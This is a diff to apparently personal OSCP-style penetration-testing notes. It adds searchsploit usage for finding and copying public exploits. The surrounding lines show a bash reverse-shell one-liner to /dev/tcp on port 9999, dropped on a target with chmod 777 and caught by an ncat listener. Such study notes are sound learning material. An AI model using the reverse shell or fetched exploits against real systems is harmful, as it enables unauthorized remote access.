@@ -255,6 +255,15 @@ https://github.com/DominicBreuker/pspy
  - #!/bin/bash<br />
 bash -i >& /dev/tcp/IP/9999 0>&1
  - After transferring it to the target, I set every permission with chmod 777 NameOfFile  and set up my ncat listener on port 9999.
+ 
+ 
+ ### searchslpoit
+ Searchsploit useful commands:
+
+ -   searchsploit “Linux Kernel”
+ -   searchsploit -m 7618 — Paste the exploit in the current directory
+ -   searchsploit -p 7618[.c] — Show complete path
+ -   searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
  ### Cool links: 
  https://arnavtripathy98.medium.com/my-oscp-struggle-210a4496ffe8
  - https://guif.re/linuxeop
